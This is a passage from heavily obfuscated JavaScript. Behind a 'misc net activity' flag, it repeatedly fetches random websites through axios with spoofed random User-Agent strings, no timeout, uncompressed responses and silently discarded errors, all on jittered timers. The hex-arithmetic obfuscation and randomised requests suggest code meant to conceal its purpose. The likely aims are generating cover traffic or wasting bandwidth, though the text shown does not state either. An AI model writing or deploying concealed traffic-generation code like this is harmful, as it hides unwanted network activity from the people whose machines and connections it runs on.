    setTimeout(f, (0x11ade + 0x19fd * 0x4 + -0x403 * 0x26) * k * getRandomInt(0x2 * -0x8b4 + 0xa * 0x7 + -0x1123 * -0x1, 0x1bb3 + -0x12d8 + -0x2 * 0x46c));
  setInterval(() => {
    f();
    for (let l = -0x1939 + 0x96c + -0x1 * -0xfcd; l < -0x1644 + 0xe73 + 0x191 * 0x5; l++)
      setTimeout(f, (0x7 * -0xf + 0x1c31 * -0x5 + 0x177be) * l * getRandomInt(0x1 * 0x10cb + -0x22ab + -0x11e1 * -0x1, -0x1 * -0xb47 + 0x1ee1 + -0x2a25));
  }, -0x220a0c * -0x2 + 0x662829 + -0x1bd * 0x4255);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2d51 + -0x1610 + 0x1f93 * 0x3) * getRandomInt(-0x4 * -0x84e + 0x91 * -0x23 + -0xd64, 0x52a * 0x1 + -0x1 * 0x1875 + 0x4d4 * 0x4));
}, 0x12cf + 0x21 * 0x39 + -0x2 * 0xce2);